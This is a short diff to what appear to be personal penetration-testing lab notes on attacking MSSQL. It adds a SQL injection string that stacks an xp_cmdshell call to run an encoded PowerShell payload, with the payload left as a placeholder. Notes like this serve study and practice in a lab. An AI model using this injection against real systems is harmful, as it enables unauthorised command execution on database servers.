@@ -320,6 +320,8 @@ Though to be honest, this payload is straight from the PayloadAllThings repo, an
 
 4) Pretty straight forward  MSSQL. Once I enabled xp_command shell using https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 All I had to do at that point was re-create the powershell payload to encode everything in base 64 as shown in Common Web Application Attacks ~line 170
+
+SOMEPARAMETER=test'%3bEXEC+master.dbo.xp_cmdshell+'powershell+-enc+<base64payload>'%3b+--+//
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
